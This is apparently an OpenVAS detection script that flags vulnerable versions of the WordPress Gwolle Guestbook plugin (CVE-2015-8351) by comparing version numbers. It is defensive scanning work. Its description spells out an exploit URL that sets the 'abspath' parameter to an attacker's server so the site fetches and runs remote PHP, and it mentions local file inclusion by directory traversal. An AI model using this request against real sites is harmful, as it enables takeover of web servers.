###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Gwolle Guestbook Plugin Remote File Inclusion Vulnerability
#
# Authors:
# Adrian Steins <adrian.steins@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112042");
  script_version("2020-11-10T11:45:08+0000");
  script_tag(name:"last_modification", value:"2020-11-10 11:45:08 +0000 (Tue, 10 Nov 2020)");
  script_tag(name:"creation_date", value:"2017-09-12 11:05:31 +0200 (Tue, 12 Sep 2017)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2015-8351");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WordPress Gwolle Guestbook Plugin Remote File Inclusion Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_plugin_http_detect.nasl");
  script_mandatory_keys("wordpress/plugin/gwolle-gb/detected");

  script_tag(name:"summary", value:"PHP remote file inclusion vulnerability in the Gwolle Guestbook plugin for WordPress,
  when allow_url_include is enabled, allows remote authenticated users to execute arbitrary PHP code via a URL in the abspath parameter
  to frontend/captcha/ajaxresponse.php.

  NOTE: this can also be leveraged to include and execute arbitrary local files via directory traversal sequences regardless of whether allow_url_include is enabled.");

  script_tag(name:"insight", value:"HTTP GET parameter 'abspath' is not being properly sanitized before being used in PHP require() function.
  A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server.
  In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:

  http://example.com/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]

  In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code.");

  script_tag(name:"impact", value:"Successful exploitation of this vulnerability will lead to entire WordPress installation compromise,
  and may even lead to the entire web server compromise.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.");

  script_tag(name:"affected", value:"WordPress Gwolle Guestbook plugin before 1.5.4.");

  script_tag(name:"solution", value:"Update to version 1.5.4 or later.");

  script_xref(name:"URL", value:"https://wordpress.org/plugins/gwollegb/#changelog");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/134599/WordPress-Gwolle-Guestbook-1.5.3-Remote-File-Inclusion.html");

  exit(0);
}

CPE = "cpe:/a:zenoweb:gwolle-gb";

include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: TRUE ) ) exit( 0 );

version = infos["version"];
location = infos["location"];

if ( version_is_less( version: version, test_version: "1.5.4" )) {
  report = report_fixed_ver( installed_version: version, fixed_version: "1.5.4", install_path: location );
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
